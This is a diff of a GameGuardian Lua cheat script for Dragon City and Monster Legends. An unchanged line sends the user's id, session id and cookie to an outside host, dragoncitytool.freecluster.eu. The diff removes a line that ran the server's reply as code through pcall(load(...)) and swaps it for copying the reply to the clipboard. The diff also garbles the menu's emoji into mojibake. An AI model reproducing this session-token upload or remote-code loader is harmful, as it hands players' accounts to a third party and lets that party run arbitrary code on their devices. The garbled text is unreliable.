@@ -1,5 +1,5 @@
 function Main()
-menu = gg.choice({'🔵Dragon City🔵','🔵Monster Legends🔵'},nil, '🔵Game Tool🔵')
+menu = gg.choice({'馃數Dragon City馃數','馃數Monster Legends馃數'},nil, '馃數Game Tool馃數')
 if menu == 1 then as() 
 while true do
 if gg.isVisible() then
@@ -34,8 +34,12 @@ input[2] = input[2]
 input[3] = input[3]
 input[4] = input[4]
 internet_a = gg.makeRequest('http://dragoncitytool.freecluster.eu/user?game=dragoncity&commands=internet&',{['Content-Type']='application/x-www-form-urlencoded',['Cookie']=SA},'userid='..SE..'&sessionid='..SS..'&info='..SE..'&').content
-if not internet_a then gg.alert('SERVER: Allow Internet Connection...') else pcall(load(internet_a)) gg.alert('Error: Time Cookies') end
+if not internet_a then gg.alert('SERVER: Allow Internet Connection...') else gg.copyText(internet_a, false) gg.alert('Error: Time Cookies') end
 end
+
+
+
+
 
 if input[5] then
 gg.setRanges(gg.REGION_C_ALLOC)
